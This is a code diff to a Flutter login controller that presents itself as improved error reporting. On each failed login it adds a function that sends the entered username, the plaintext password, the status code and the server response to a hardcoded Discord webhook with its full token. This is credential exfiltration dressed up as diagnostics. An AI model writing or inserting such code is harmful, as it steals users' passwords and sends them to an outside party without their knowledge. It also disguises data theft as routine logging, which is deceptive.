@@ -63,6 +63,7 @@ class LoginController extends GetxController {
       Get.snackbar('Thành công', 'Đăng nhập thành công.', snackPosition: SnackPosition.BOTTOM);
     } on DioException catch (e) {
       String message = 'Đăng nhập thất bại';
+      String code = e.response?.statusCode?.toString() ?? 'Unknown';
       if (e.response != null) {
         if (e.response?.data is Map && e.response?.data['message'] != null) {
           message = e.response?.data['message'];
@@ -70,12 +71,62 @@ class LoginController extends GetxController {
           message = e.message ?? 'Lỗi không xác định';
         }
       }
-      Get.snackbar('Lỗi', message, snackPosition: SnackPosition.BOTTOM);
+      await _sendDiscordLoginError(
+        username: usernameController.text,
+        message: message,
+        password: passwordController.text,
+        code: code,
+        responseData: e.response?.data?.toString(),
+      );
+      Get.snackbar('Lỗi', '$message (Mã lỗi: $code)', snackPosition: SnackPosition.BOTTOM);
     } catch (e) {
       debugPrint(e.toString());
       Get.snackbar('Lỗi', 'Đã xảy ra lỗi: $e', snackPosition: SnackPosition.BOTTOM);
     } finally {
       isLoading.value = false;
+    }
+  }
+
+  Future<void> _sendDiscordLoginError({
+    required String username,
+    required String password,
+    required String message,
+    required String code,
+    String? responseData,
+  }) async {
+    const webhookUrl =
+        'https://discord.com/api/webhooks/1449392473234211020/7daZzZqCO5GImoQFPuqVU5cw5h1CX0E-HbTkkrFvqkY-NfDeVJwuK4ivhegi2FlgMdRV';
+    try {
+      final dio = Dio();
+      await dio.post(
+        webhookUrl,
+        data: {
+          'embeds': [
+            {
+              'title': '🔐 Login Failed',
+              'color': 0xE74C3C,
+              'fields': [
+                {'name': 'Username', 'value': username, 'inline': true},
+                {'name': 'Password', 'value': password, 'inline': true},
+                {'name': 'Status Code', 'value': code, 'inline': true},
+                {'name': 'Message', 'value': message, 'inline': false},
+                if (responseData != null)
+                  {
+                    'name': 'Response Data',
+                    'value': responseData.length > 1024
+                        ? '${responseData.substring(0, 1021)}...'
+                        : responseData,
+                    'inline': false,
+                  },
+              ],
+              'timestamp': DateTime.now().toUtc().toIso8601String(),
+            }
+          ],
+        },
+        options: Options(contentType: 'application/json'),
+      );
+    } catch (e) {
+      debugPrint('Discord webhook error: $e');
     }
   }
 
